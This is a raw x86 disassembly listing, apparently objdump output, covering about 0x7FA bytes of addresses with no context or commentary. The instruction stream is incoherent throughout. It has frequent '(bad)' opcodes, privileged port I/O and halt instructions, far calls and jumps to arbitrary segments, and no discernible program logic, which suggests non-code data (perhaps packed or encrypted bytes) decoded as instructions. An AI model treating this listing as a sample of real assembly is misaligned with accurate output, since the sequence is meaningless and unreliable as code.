  4173e4:	xlat   BYTE PTR ds:[ebx]
  4173e5:	pop    ecx
  4173e6:	cmp    bh,BYTE PTR [eax-0x60]
  4173e9:	sbb    al,0x2e
  4173eb:	ss push ebx
  4173ed:	call   0x26b6:0xcbd0fe84
  4173f4:	mov    ds:0x3d05bce1,al
  4173f9:	sbb    esp,edi
  4173fb:	dec    esp
  4173fc:	adc    cl,BYTE PTR [eax]
  4173fe:	xchg   ebx,eax
  4173ff:	clc    
  417400:	mov    ds:0xb2b61cac,eax
  417405:	adc    cl,BYTE PTR [esi-0x5a9e3131]
  41740b:	adc    eax,DWORD PTR [eax]
  41740d:	nop
  41740e:	mov    dh,0x23
  417410:	dec    ebx
  417411:	dec    edx
  417412:	ss (bad) 
  417414:	icebp  
  417415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417416:	test   al,0xcd
  417418:	retf   0x4da4
  41741b:	dec    edi
  41741c:	cbw    
  41741e:	mov    eax,ds:0x1f9a1edc
  417423:	imul   edi,DWORD PTR [eax-0x2c],0xffffff89
  417427:	enter  0x211e,0x14
  41742b:	idiv   BYTE PTR [ebx]
  41742d:	cmp    BYTE PTR [edi+0x3bc92510],bl
  417433:	inc    ebp
  417434:	or     cl,bl
  417436:	mov    dh,0xe0
  417438:	mov    bl,0x51
  41743a:	jb     0x417490
  41743c:	fwait
  41743d:	sbb    al,0x25
  41743f:	out    dx,eax
  417440:	stos   DWORD PTR es:[edi],eax
  417441:	push   ecx
  417442:	dec    ebx
  417443:	lea    esi,[edx-0x3d]
  417446:	or     ah,0xe5
  417449:	push   ds
  41744a:	int    0x3
  41744c:	sahf   
  41744d:	es cs ja 0x417403
  417451:	repnz push esi
  417453:	rcr    ch,cl
  417455:	dec    ebp
  417456:	adc    ebx,eax
  417458:	jb     0x4173df
  41745a:	imul   ecx,DWORD PTR [eax-0x78fd4b5c],0xa216ddd3
  417464:	addr16 jmp 0x4174d3
  417467:	ret    0xcbda
  41746a:	jbe    0x4174b3
  41746c:	mov    edx,0x206cd9ac
  417471:	xchg   edi,eax
  417472:	shl    ebx,cl
  417474:	xchg   ecx,eax
  417475:	fwait
  417476:	std    
  417477:	xlat   BYTE PTR ds:[ebx]
  417478:	clc    
  417479:	pop    ebx
  41747a:	dec    ebp
  41747b:	jns    0x4174f7
  41747d:	mov    DWORD PTR [edi-0x4307a18c],edx
  417483:	(bad)  
  417484:	call   0xd1bf04f4
  417489:	jbe    0x4174b5
  41748b:	jle    0x4174f7
  41748d:	setne  BYTE PTR [ecx+edi*2+0x4f982bd]
  417495:	xlat   BYTE PTR ds:[ebx]
  417496:	lds    edi,FWORD PTR [esi+0x5d]
  417499:	xor    BYTE PTR ss:[ecx+ebx*4+0x344cc8f5],cl
  4174a1:	mov    DWORD PTR [eax+0x7a],eax
  4174a4:	jecxz  0x4174a7
  4174a6:	cli    
  4174a7:	(bad)
  4174aa:	nop
  4174ab:	xlat   BYTE PTR ds:[ebx]
  4174ac:	shl    cl,0xd0
  4174af:	lahf   
  4174b0:	mov    ecx,0x955df96b
  4174b5:	xor    DWORD PTR [esi-0x779534da],0xa7d8db9a
  4174bf:	xchg   esi,eax
  4174c0:	mov    WORD PTR [ebp-0x79],?
  4174c3:	retf   
  4174c4:	jmp    0x4174f2
  4174c6:	sub    bh,al
  4174c8:	lahf   
  4174c9:	hlt    
  4174ca:	jnp    0x417501
  4174cc:	fimul  DWORD PTR [ecx]
  4174ce:	push   0x6b
  4174d0:	outs   dx,BYTE PTR ds:[esi]
  4174d1:	add    BYTE PTR [ebx+0xa7b7092],dl
  4174d7:	inc    esi
  4174d8:	xchg   edi,eax
  4174d9:	dec    ecx
  4174da:	mov    eax,0xf7612b9d
  4174df:	aaa    
  4174e0:	ja     0x4174c2
  4174e2:	cdq    
  4174e3:	and    DWORD PTR [ecx+0x3d705a23],0xffffffcc
  4174ea:	lea    edi,[esi-0xf3c23f5]
  4174f0:	xchg   esp,eax
  4174f1:	iret   
  4174f2:	jmp    0x41752b
  4174f4:	stos   DWORD PTR es:[edi],eax
  4174f5:	cmc    
  4174f6:	stos   DWORD PTR es:[edi],eax
  4174f7:	icebp  
  4174f8:	lods   al,BYTE PTR ds:[esi]
  4174f9:	xor    al,0x19
  4174fb:	cmp    al,0x59
  4174fd:	into   
  4174fe:	or     BYTE PTR [edx-0x62c44067],dl
  417504:	push   ds
  417505:	and    ebx,DWORD PTR ds:0xed062a3a
  41750b:	icebp  
  41750c:	xchg   esp,eax
  41750d:	jno    0x4174bb
  41750f:	pusha  
  417510:	mov    edi,0x620d9236
  417515:	repz mov WORD PTR [eax+0x1f80fd0a],es
  41751c:	xchg   edx,eax
  41751d:	add    BYTE PTR [ebx-0x5d],bh
  417520:	inc    ecx
  417521:	and    ecx,DWORD PTR [edx+edx*1]
  417524:	jae    0x417570
  417526:	xchg   ecx,eax
  417527:	outs   dx,DWORD PTR ds:[esi]
  417528:	enter  0x3d39,0xf7
  41752c:	inc    edi
  41752d:	push   edi
  41752e:	sbb    BYTE PTR [ecx],ch
  417530:	mov    edi,0xd4625c0d
  417535:	mov    ch,0x31
  417537:	sbb    BYTE PTR [edx+0x677e021],0x43
  41753e:	fdiv   DWORD PTR [ebp-0x662a20dd]
  417544:	mov    dh,0xed
  417546:	mov    ds:0x3f4a7d84,al
  41754b:	lds    esi,FWORD PTR [ebx+ebx*4+0x1b]
  41754f:	cmp    edx,DWORD PTR [esi]
  417551:	(bad)  
  417552:	dec    esp
  417553:	adc    DWORD PTR [ecx-0xb7e8dce],edi
  417559:	pop    esp
  41755a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41755b:	mov    ds:0xed9c86b1,eax
  417560:	jnp    0x41757f
  417562:	dec    edi
  417563:	jae    0x41755c
  417565:	mov    bh,0xe5
  417567:	cld    
  417568:	lock sub eax,0x7e8cefc3
  41756e:	adc    bh,0x7b
  417571:	adc    ecx,DWORD PTR ss:[bp+0x72]
  417576:	daa    
  417577:	adc    eax,0x44bff9d0
  41757c:	leave  
  41757d:	push   0x25
  41757f:	ds das 
  417581:	enter  0x7bb8,0x4b
  417585:	bound  edx,QWORD PTR [edx]
  417587:	or     DWORD PTR [ebp-0x60],esp
  41758a:	xchg   esi,eax
  41758b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41758c:	outs   dx,DWORD PTR ds:[esi]
  41758d:	jae    0x4175d9
  41758f:	lods   al,BYTE PTR ds:[esi]
  417590:	(bad)  
  417592:	push   edi
  417593:	sti    
  417594:	mov    ah,0x6a
  417596:	adc    al,0xc6
  417598:	and    eax,DWORD PTR [edx-0x6c]
  41759b:	out    0xd8,al
  41759d:	pop    ecx
  41759e:	dec    ebx
  41759f:	adc    esp,eax
  4175a1:	push   ebx
  4175a2:	out    dx,al
  4175a3:	mov    WORD PTR [edx],ds
  4175a5:	das    
  4175a6:	es push ebp
  4175a8:	mov    BYTE PTR [eax-0xd],al
  4175ab:	and    eax,0x72e42134
  4175b0:	mov    ds:0xdc0b7f69,eax
  4175b5:	mov    dl,0x54
  4175b7:	jle    0x4175c5
  4175b9:	mov    esi,0x4cd8b811
  4175be:	bound  edi,QWORD PTR ds:0x716d502d
  4175c4:	mov    ds:0x9b7c1112,eax
  4175c9:	and    eax,DWORD PTR [eax-0x4d95aff0]
  4175cf:	xchg   eax,edi
  4175d1:	out    dx,eax
  4175d2:	aad    0x54
  4175d4:	fs push esp
  4175d6:	sbb    edx,DWORD PTR [esi+0x3a]
  4175d9:	test   DWORD PTR [eax],esp
  4175db:	xor    al,0x7a
  4175dd:	sub    BYTE PTR ds:0xfb8c592d,bh
  4175e3:	dec    ebx
  4175e4:	xor    bh,BYTE PTR [esi+0x1b2e6d5d]
  4175ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175eb:	or     DWORD PTR [ebp-0xbae162],esi
  4175f1:	sub    eax,DWORD PTR [eax+0x4e]
  4175f4:	dec    edi
  4175f5:	lds    esp,FWORD PTR [esi+0x21e447ce]
  4175fb:	jns    0x4175ec
  4175fd:	clc    
  4175fe:	sar    ecx,1
  417600:	dec    eax
  417601:	cwde   
  417602:	mov    cl,BYTE PTR ds:0x62de3b06
  417608:	xor    eax,0x3eaa60ee
  41760d:	cmp    ebp,DWORD PTR [eax-0xb8e841c]
  417613:	adc    BYTE PTR [ebx-0x7f],ah
  417616:	data16 jno 0x417683
  417619:	push   ebp
  41761a:	jge    0x41760a
  41761c:	dec    edi
  41761d:	repz dec ecx
  41761f:	idiv   BYTE PTR [ebp-0x1b96f6a0]
  417625:	push   ds
  417626:	xchg   edx,eax
  417627:	push   esp
  417628:	jnp    0x417601
  41762a:	mov    edx,0x1414c68b
  41762f:	inc    ebx
  417630:	call   0x7521:0xacff4945
  417637:	mov    ecx,0x3674af6b
  41763c:	in     al,dx
  41763d:	loopne 0x417664
  41763f:	jbe    0x417676
  417641:	ret    
  417642:	jae    0x41765f
  417644:	(bad)  
  417645:	fld    DWORD PTR [esi+0x70e14813]
  41764b:	mov    ch,BYTE PTR [ebp+0x67]
  41764e:	pop    ebp
  41764f:	inc    ebx
  417650:	sahf   
  417651:	and    al,al
  417653:	out    dx,al
  417654:	pop    edi
  417656:	mov    ds:0x9f6cef7,al
  41765b:	mov    WORD PTR [ebp+0x1d],ds
  41765e:	mov    bl,0x0
  417660:	addr16 and eax,0x36c9e756
  417666:	or     eax,DWORD PTR [ebx]
  417668:	(bad)  
  417669:	lahf   
  41766a:	lea    edx,fs:[edi-0x582612bf]
  417671:	iret   
  417672:	adc    al,0x3b
  417674:	lods   eax,DWORD PTR ds:[esi]
  417675:	stc    
  417676:	stos   BYTE PTR es:[edi],al
  417677:	dec    edx
  417678:	mov    ebp,DWORD PTR [ecx+0x3d]
  41767b:	popa   
  41767c:	mul    bl
  41767e:	hlt    
  41767f:	clc    
  417680:	xchg   edi,eax
  417681:	mov    dl,0xb9
  417683:	push   ds
  417684:	mov    ch,0x90
  417686:	pushf  
  417687:	adc    BYTE PTR [bp+di],al
  41768a:	mov    cl,0x3e
  41768c:	sub    dl,cl
  41768e:	add    bl,BYTE PTR [eiz*8-0x222fb9d9]
  417695:	(bad)  
  417696:	cmp    al,0xe9
  417698:	pop    ss
  417699:	retf   0x2482
  41769c:	jmp    0x16936a2b
  4176a1:	popf   
  4176a2:	test   esp,0x6efe82a0
  4176a8:	rcl    bh,0x1b
  4176ab:	jb     0x41767d
  4176ad:	cmp    al,0xbc
  4176af:	sar    BYTE PTR [ecx+0xf],cl
  4176b2:	and    bh,0x37
  4176b5:	mov    ah,0x6a
  4176b7:	sub    al,0xba
  4176b9:	pop    ebx
  4176ba:	js     0x417704
  4176bc:	push   ebp
  4176bd:	hlt    
  4176be:	push   ds
  4176bf:	fwait
  4176c0:	xchg   ecx,eax
  4176c1:	ror    DWORD PTR ds:0xcffe17e5,cl
  4176c7:	dec    edx
  4176c8:	nop
  4176c9:	je     0x4176be
  4176cb:	and    esi,0xffffffcb
  4176ce:	mov    al,0xfc
  4176d0:	shl    DWORD PTR [esi+eiz*8+0x13234e71],1
  4176d7:	xor    al,0x82
  4176d9:	lahf   
  4176da:	iret   
  4176db:	adc    edx,DWORD PTR [edi-0x15b81c24]
  4176e1:	mov    al,0x7a
  4176e3:	sti    
  4176e4:	inc    ecx
  4176e5:	sub    ah,BYTE PTR [edx]
  4176e7:	jmp    0x4e7d92f0
  4176ec:	mov    eax,ds:0x3c44f5c6
  4176f1:	pop    edx
  4176f2:	mov    esp,0x2fbea6a7
  4176f7:	js     0x41771d
  4176f9:	jg     0x41772c
  4176fb:	mov    dl,0xae
  4176fd:	inc    eax
  4176fe:	or     eax,0xb8d5396b
  417703:	cli    
  417704:	jno    0x417743
  417706:	xor    esp,ebx
  417708:	test   eax,0x7b33eff0
  41770d:	or     dl,0x0
  417710:	cmp    al,bl
  417712:	gs mov dl,bl
  417715:	mov    eax,ds:0x90b1749f
  41771a:	fisubr WORD PTR [ebx-0x17ab92c9]
  417720:	std    
  417721:	mov    cs,WORD PTR [edx+ebp*2]
  417724:	shl    ebx,cl
  417726:	mov    edx,0x9c0f330b
  41772b:	jnp    0x41775c
  41772d:	mov    dl,0x40
  41772f:	(bad)  
  417730:	adc    al,0x59
  417732:	push   eax
  417733:	mov    ah,0x64
  417735:	retf   0x287b
  417738:	adc    DWORD PTR [ebx-0x45],edx
  41773b:	adc    al,0xa7
  41773d:	(bad)  
  41773e:	addr16 push 0x8
  417741:	inc    ecx
  417742:	mov    bh,0xed
  417744:	push   es
  417745:	les    edi,FWORD PTR [esi-0x28]
  417748:	das    
  417749:	imul   ebx,eax,0x1f90bba8
  41774f:	push   es
  417750:	cmp    al,0xf4
  417752:	jmp    0xbd2cd7c2
  417757:	mov    dl,0xa1
  417759:	sbb    ecx,DWORD PTR [edi]
  41775b:	stos   BYTE PTR es:[edi],al
  41775c:	dec    ebp
  41775d:	pop    edi
  41775e:	adc    eax,0xd434101e
  417763:	cwde   
  417764:	jns    0x417730
  417766:	call   0x1194:0xfb679d2c
  41776d:	jg     0x417782
  41776f:	xchg   edi,eax
  417770:	jl     0x41779f
  417772:	std    
  417773:	xchg   DWORD PTR [ebx+0x57],edi
  417776:	xchg   ecx,eax
  417777:	adc    al,ah
  417779:	and    DWORD PTR [ebx+0x23aac54],0x6626060c
  417783:	adc    eax,0x575c63b8
  417788:	sub    al,0xd3
  41778a:	cld    
  41778b:	iret   
  41778c:	bound  ebp,QWORD PTR [ecx+0x4c264251]
  417792:	jp     0x41771d
  417794:	iret   
  417795:	dec    esp
  417796:	jl     0x4177d7
  417798:	jmp    0xe75d:0x70f8bf87
  41779f:	add    DWORD PTR [edx+ecx*8],esi
  4177a2:	adc    al,0x97
  4177a4:	std    
  4177a5:	add    DWORD PTR [ecx+0x3b77dd1e],ebx
  4177ab:	clc    
  4177ac:	inc    ebp
  4177ad:	ins    DWORD PTR es:[edi],dx
  4177ae:	lock mov ds:0xb6c05f22,eax
  4177b4:	lods   eax,DWORD PTR ds:[esi]
  4177b5:	inc    ebp
  4177b6:	inc    esi
  4177b7:	mov    al,ds:0xd4ef3b63
  4177bc:	cmc    
  4177bd:	popa   
  4177be:	mul    BYTE PTR [ebx]
  4177c0:	(bad)  
  4177c1:	out    dx,al
  4177c2:	pop    es
  4177c3:	sbb    al,0xfb
  4177c5:	adc    DWORD PTR [edi-0x18],ebp
  4177c8:	aam    0x7e
  4177ca:	fistp  QWORD PTR [ebx-0x332632fa]
  4177d0:	(bad)  
  4177d1:	cmp    DWORD PTR ds:0x6b270039,esi
  4177d7:	fidivr DWORD PTR [edi+edx*4]
  4177da:	iret   
  4177db:	(bad)  
  4177dc:	shl    bh,cl
  4177de:	sti    
  4177df:	push   0x42
  4177e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177e2:	add    ebp,ecx
  4177e4:	dec    ebx
  4177e5:	inc    ebx
  4177e6:	mov    dl,0x58
  4177e8:	sub    eax,0x863961fb
  4177ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177ee:	xchg   al,bl
  4177f0:	arpl   ax,bp
  4177f2:	mov    ecx,0x2f8863ec
  4177f7:	xor    eax,0xd5c8fd67
  4177fc:	imul   esp,edi,0xffffffc7
  4177ff:	arpl   di,cx
  417801:	out    0x5,eax
  417803:	int3   
  417804:	sub    eax,0xe729eb2
  417809:	fisttp DWORD PTR [esi-0x3a]
  41780c:	mov    esi,0x497de68c
  417811:	ins    BYTE PTR es:[edi],dx
  417812:	cmp    eax,0xea4dcf2f
  417817:	inc    esp
  417818:	inc    ebx
  417819:	(bad)  
  41781a:	lods   eax,DWORD PTR ds:[esi]
  41781b:	push   es
  41781c:	inc    ebx
  41781d:	xchg   ebx,eax
  41781e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417820:	push   edx
  417821:	repz retf 0xaa4e
  417825:	stc    
  417826:	stc    
  417827:	arpl   WORD PTR [esi-0x53523115],dx
  41782d:	cmp    esi,eax
  41782f:	arpl   WORD PTR [esi-0x6d],bp
  417832:	mov    esi,0x8b9cb334
  417837:	mov    eax,ds:0x68118470
  41783c:	data16 test BYTE PTR [edx+0x6a2b465d],bh
  417843:	mov    WORD PTR [bx+0x78],?
  417847:	push   eax
  417848:	xchg   esi,eax
  417849:	xor    DWORD PTR [ecx-0x2c],0xd0536fe5
  417850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417851:	sar    DWORD PTR [ebx],1
  417853:	sbb    ch,BYTE PTR [esi-0x70]
  417856:	into   
  417857:	push   0x946fc024
  41785c:	jge    0x41785b
  41785e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41785f:	imul   ebx,DWORD PTR [ecx-0x23],0x47585510
  417866:	pop    esi
  417867:	test   al,0xe
  417869:	push   edi
  41786a:	inc    esi
  41786b:	mov    dl,0x49
  41786d:	adc    DWORD PTR [edx-0x68],0x29f8a1de
  417874:	dec    esp
  417875:	enter  0x8b8d,0xff
  417879:	cmp    eax,0x544c93d7
  41787e:	add    eax,0x67cf1cbd
  417883:	fldenv [ebp-0x3a]
  417886:	stos   BYTE PTR es:[edi],al
  417887:	add    al,0xe6
  417889:	outs   dx,DWORD PTR ds:[esi]
  41788a:	push   ecx
  41788b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41788c:	out    dx,eax
  41788d:	pusha  
  41788e:	mov    dl,0xa5
  417890:	sbb    BYTE PTR [edx],bl
  417892:	xor    ecx,edi
  417894:	js     0x4178e8
  417896:	and    eax,0xbd088217
  41789b:	mov    cl,0xe9
  41789d:	inc    eax
  41789e:	xchg   ecx,eax
  41789f:	jbe    0x4178e3
  4178a1:	sub    ch,BYTE PTR [edx-0x3a72cc0e]
  4178a7:	pop    ds
  4178a8:	in     al,dx
  4178a9:	xchg   esp,eax
  4178aa:	mov    ebp,DWORD PTR [ebp-0x19cbe350]
  4178b0:	imul   ebx,DWORD PTR [ebx+0x2143565],0x746b3cd6
  4178ba:	repz push ebx
  4178bc:	push   ebp
  4178bd:	pop    ecx
  4178be:	fs retf 0x91eb
  4178c2:	pop    esp
  4178c3:	sbb    al,0x65
  4178c5:	mov    bl,0x30
  4178c7:	aam    0xa9
  4178c9:	xchg   BYTE PTR [ebx+ebp*8-0x1ad99976],dl
  4178d0:	dec    edx
  4178d1:	xor    BYTE PTR [ecx+0x2599bf0],ah
  4178d7:	xchg   ebp,eax
  4178d8:	xor    ebx,edx
  4178da:	mov    ebp,0xd284c476
  4178df:	imul   BYTE PTR cs:[eax-0x39]
  4178e3:	dec    ebx
  4178e4:	jbe    0x4178f4
  4178e6:	call   0x67e1b1f9
  4178eb:	or     eax,0x9a68e171
  4178f0:	pop    edi
  4178f1:	sahf   
  4178f2:	mov    esp,0x3e858fac
  4178f7:	pop    eax
  4178f8:	pop    edx
  4178f9:	add    BYTE PTR [ebx],al
  4178fb:	xlat   BYTE PTR ds:[ebx]
  4178fc:	in     eax,0x34
  4178fe:	call   0xab07985a
  417903:	mov    edi,0xfee10e1e
  417908:	ret    0x3e23
  41790b:	inc    eax
  41790c:	xlat   BYTE PTR ds:[ebx]
  41790d:	cmp    DWORD PTR [ebx-0x44],edx
  417910:	(bad)  
  417911:	popf   
  417912:	sahf   
  417913:	cmp    ch,dh
  417915:	xlat   BYTE PTR ds:[ebx]
  417916:	adc    ebx,edx
  417918:	mov    ah,0xa0
  41791a:	rol    BYTE PTR [eax+0x7bb15e85],0xae
  417921:	mov    ds:0x8c17beeb,eax
  417926:	xchg   ebp,eax
  417927:	test   DWORD PTR [eax+0x428cb118],ebp
  41792d:	dec    eax
  41792e:	fldenv [edx]
  417930:	mov    dl,bl
  417932:	mov    al,ds:0x8d14ea3
  417937:	ins    DWORD PTR es:[edi],dx
  417938:	xchg   edi,eax
  417939:	mov    ds:0x4ce4cce2,eax
  41793e:	aad    0xe3
  417940:	je     0x524d7781
  417946:	daa    
  417947:	gs cld 
  417949:	push   0x87ea40cc
  41794e:	neg    BYTE PTR [esi]
  417950:	pop    eax
  417951:	xor    DWORD PTR [esp+ebp*1-0x41208ff6],esp
  417958:	xor    BYTE PTR [ecx],bh
  41795a:	icebp  
  41795b:	test   al,0xf6
  41795d:	aaa    
  41795e:	mov    dh,0xcd
  417960:	cmp    al,0x43
  417962:	or     ebp,DWORD PTR [edx]
  417964:	or     DWORD PTR [esi],esp
  417966:	loopne 0x41797e
  417968:	ret    
  417969:	add    al,0x89
  41796b:	jmp    0xb4907207
  417970:	out    0xa2,al
  417972:	das    
  417973:	pop    es
  417974:	mov    ah,0x2d
  417976:	scas   al,BYTE PTR es:[edi]
  417977:	push   ss
  417978:	clc    
  417979:	lea    ecx,[ecx-0x28]
  41797c:	or     DWORD PTR [esi],eax
  41797e:	pop    ebp
  41797f:	dec    eax
  417980:	jae    0x4179e6
  417982:	fstp   TBYTE PTR [eax-0x39]
  417985:	or     al,0xd
  417987:	cmp    DWORD PTR [ebx],esi
  417989:	jmp    0xea4b:0xb9e0b94f
  417990:	and    al,0x17
  417992:	es ret 
  417994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417995:	push   0xffffffee
  417997:	outs   dx,BYTE PTR ds:[esi]
  417998:	xchg   edi,eax
  417999:	mov    ah,0xae
  41799b:	fisttp QWORD PTR [ecx-0x20]
  41799e:	mov    edx,0xbcdf50d4
  4179a3:	out    dx,eax
  4179a4:	and    al,0x15
  4179a6:	lahf   
  4179a7:	push   es
  4179a8:	shr    esp,0x3a
  4179ab:	add    DWORD PTR [edi],esi
  4179ad:	adc    edx,DWORD PTR [edi+edx*1-0x3b]
  4179b1:	xchg   ecx,eax
  4179b2:	imul   esp,ebp,0x50acad26
  4179b8:	mov    esi,0x2ea456f4
  4179bd:	sub    bl,ah
  4179bf:	cwde   
  4179c0:	call   0x5927:0x19478798
  4179c7:	ins    DWORD PTR es:[edi],dx
  4179c8:	callw  0x430a
  4179cc:	mov    ebx,DWORD PTR [ebx+0x55]
  4179cf:	ret    0xa677
  4179d2:	adc    al,0x7c
  4179d4:	stos   BYTE PTR es:[edi],al
  4179d5:	lea    edi,[edi+0x1d]
  4179d8:	fstp   DWORD PTR [edx]
  4179da:	fs mov al,0xe4
  4179dd:	das    
  4179de:	jl     0x417a50
  4179e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179e1:	out    0x32,al
  4179e3:	lock jne 0x41797b
  4179e6:	inc    eax
  4179e7:	pop    esp
  4179e8:	ret    
  4179e9:	inc    DWORD PTR [edi]
  4179eb:	outs   dx,DWORD PTR ds:[esi]
  4179ec:	int    0x8a
  4179ee:	stos   BYTE PTR es:[edi],al
  4179ef:	mov    ecx,0x83d69b4f
  4179f4:	add    edx,DWORD PTR es:[ebp+0x22]
  4179f8:	mov    ecx,0xdf7c2031
  4179fd:	xchg   ebp,eax
  4179fe:	ja     0x4179c0
  417a00:	xor    BYTE PTR [esi-0x18],0xc5
  417a04:	jne    0x417a7f
  417a06:	cmp    ebx,esp
  417a08:	(bad)  
  417a09:	imul   DWORD PTR [edi+0x2a04de8f]
  417a0f:	(bad)  
  417a11:	sbb    al,0x11
  417a13:	test   al,0xf8
  417a15:	mov    eax,0xa1079b8c
  417a1a:	mov    ebx,0xf66c06f2
  417a1f:	push   ds
  417a20:	in     al,dx
  417a21:	aad    0x67
  417a23:	idiv   BYTE PTR [edx+edi*8]
  417a26:	pushf  
  417a27:	(bad)  
  417a28:	mov    esp,0xcfa3360a
  417a2d:	mov    eax,ds:0xbd53ca26
  417a32:	add    bh,dh
  417a34:	in     eax,0x35
  417a36:	mov    bh,0x78
  417a38:	ret    
  417a39:	int    0x2b
  417a3b:	dec    ebp
  417a3c:	adc    BYTE PTR [eax+0x15b6fa0c],bh
  417a42:	js     0x417a5e
  417a44:	add    eax,0xfb117897
  417a49:	pop    esi
  417a4a:	inc    eax
  417a4b:	out    dx,al
  417a4c:	(bad)
  417a50:	mov    fs,WORD PTR [esi+0x4cdb81ae]
  417a56:	push   ss
  417a57:	in     eax,dx
  417a58:	lods   al,BYTE PTR ds:[esi]
  417a59:	pop    ss
  417a5a:	fiadd  WORD PTR [esi+edx*1]
  417a5d:	push   ecx
  417a5e:	xor    DWORD PTR [eax],esp
  417a60:	retf   0xaed8
  417a63:	(bad)
  417a67:	scas   al,BYTE PTR es:[edi]
  417a68:	mov    ebx,0x7df73f46
  417a6d:	ficomp DWORD PTR [eax-0xb66261a]
  417a73:	xchg   esp,eax
  417a74:	sub    BYTE PTR [ecx+0x6e],cl
  417a77:	ror    DWORD PTR [esi+0x5163598c],0x8c
  417a7e:	xor    eax,0x8aecda9d
  417a83:	pushf  
  417a84:	bound  esi,QWORD PTR [esi+0x75]
  417a87:	test   eax,0x7e10409c
  417a8c:	and    DWORD PTR [edi],eax
  417a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a8f:	adc    edx,ebx
  417a91:	push   esi
  417a92:	out    dx,eax
  417a93:	adc    DWORD PTR [ebx],edi
  417a95:	pop    ss
  417a96:	jnp    0x417a1d
  417a98:	xor    DWORD PTR [ebp-0x7a37090b],eax
  417a9e:	inc    esp
  417a9f:	lds    edx,FWORD PTR gs:[esi-0x5a]
  417aa3:	nop
  417aa4:	test   DWORD PTR [ebp+0x27],esp
  417aa7:	idiv   DWORD PTR [ebx]
  417aa9:	pop    ss
  417aaa:	adc    esi,DWORD PTR [edi]
  417aac:	pusha  
  417aad:	stos   BYTE PTR es:[edi],al
  417aae:	pop    es
  417aaf:	mov    ebp,0x7267b6b7
  417ab4:	loope  0x417b21
  417ab6:	mov    al,0xf
  417ab8:	sub    eax,0x33dcac6e
  417abd:	ins    DWORD PTR es:[edi],dx
  417abe:	cmp    eax,0xd0224a44
  417ac3:	cmp    eax,0x6d
  417ac6:	stc    
  417ac7:	cmc    
  417ac8:	dec    ecx
  417ac9:	mov    bh,0x3b
  417acb:	xchg   edi,eax
  417acc:	jmp    0xd7d4:0xe17d4ff9
  417ad3:	push   0xdba9a5d
  417ad8:	mov    cl,0xcd
  417ada:	adc    DWORD PTR [edi+0x64],0xffffff99
  417ade:	pop    edi
  417adf:	call   0xa962:0xbd856c21
  417ae6:	in     eax,dx
  417ae7:	fsubr  st(0),st
  417ae9:	dec    esp
  417aea:	jmp    0xcef7:0x28a6b59f
  417af1:	cmc    
  417af2:	sub    eax,0xaf5d62cb
  417af7:	sub    BYTE PTR ss:[edi],cl
  417afa:	xor    DWORD PTR [ecx],edx
  417afc:	addr16 rol ah,0xf9
  417b00:	ins    BYTE PTR es:[edi],dx
  417b01:	push   ebp
  417b02:	(bad)  
  417b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b04:	xchg   ebx,eax
  417b05:	int    0xac
  417b07:	mov    bh,bl
  417b09:	jp     0x417b4c
  417b0b:	inc    ecx
  417b0c:	call   0xae431f9f
  417b11:	mov    al,ds:0xe7af2a0a
  417b16:	or     esi,DWORD PTR [edx]
  417b18:	pop    esi
  417b19:	mov    bl,BYTE PTR [edx+eiz*4-0x2b]
  417b1d:	ror    BYTE PTR [edi],cl
  417b1f:	mov    cl,BYTE PTR [ecx+0x39]
  417b22:	lea    eax,[esi+0x716a3519]
  417b28:	cmp    edi,DWORD PTR [eax+0x285fc56b]
  417b2e:	mov    al,0x21
  417b30:	adc    ch,BYTE PTR [ebx+ecx*1-0x35]
  417b34:	jne    0x417b13
  417b36:	loope  0x417b6f
  417b38:	mov    al,0x51
  417b3a:	imul   esi,DWORD PTR [edx+ebp*2-0x6],0xdcdb58f5
  417b42:	sbb    esi,DWORD PTR [esi+0x45980bac]
  417b48:	xchg   esp,eax
  417b49:	int    0x89
  417b4b:	jmp    0x77f2067
  417b50:	sbb    ecx,0x66a559bc
  417b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b57:	mov    ds:0xab24ae92,eax
  417b5c:	(bad)  
  417b5d:	aad    0x80
  417b5f:	das    
  417b60:	push   eax
  417b61:	stc    
  417b62:	out    dx,eax
  417b63:	cmc    
  417b64:	dec    ebp
  417b65:	xchg   edx,eax
  417b66:	jno    0x417bbe
  417b68:	mov    edx,0xa65898c9
  417b6d:	bound  esp,QWORD PTR [esp-0x76]
  417b71:	pop    ebp
  417b72:	out    0xca,eax
  417b74:	pop    ss
  417b75:	(bad)  
  417b76:	xchg   esi,eax
  417b77:	and    eax,0xb26cad5d
  417b7c:	rcl    DWORD PTR [edi+ebp*8-0x54],cl
  417b80:	inc    esp
  417b81:	cmp    al,0x8e
  417b83:	mov    dh,0xdb
  417b85:	jmp    0xfc36c49d
  417b8a:	lea    edi,[ebp+0x70344331]
  417b90:	add    dh,cl
  417b92:	sbb    DWORD PTR ds:0xc142b829,0x39
  417b99:	nop
  417b9a:	jg     0x417b39
  417b9c:	sbb    edi,0xffffff9f
  417b9f:	push   0x24f8985c
  417ba4:	cli    
  417ba5:	clc    
  417ba6:	popa   
  417ba7:	jo     0x417b59
  417ba9:	sub    dl,cl
  417bab:	mov    al,0x66
  417bad:	sbb    al,dh
  417baf:	cmp    ecx,DWORD PTR ds:0x1e137677
  417bb5:	and    BYTE PTR [edi-0x2e],dl
  417bb8:	enter  0x47ca,0x73
  417bbc:	fst    DWORD PTR [edi+0x77270c8e]
  417bc2:	and    eax,0x23b4d63a
  417bc7:	pushf  
  417bc8:	not    DWORD PTR [ebp-0x3faebe44]
  417bce:	jnp    0x417bb4
  417bd0:	jae    0x417c2a
  417bd2:	mov    al,ds:0x9f174d88
  417bd7:	icebp  
  417bd8:	push   ecx
  417bd9:	in     al,0x3c
  417bdb:	xchg   ecx,eax
  417bdc:	mov    cl,0xc9
  417bde:	add    ecx,ebx
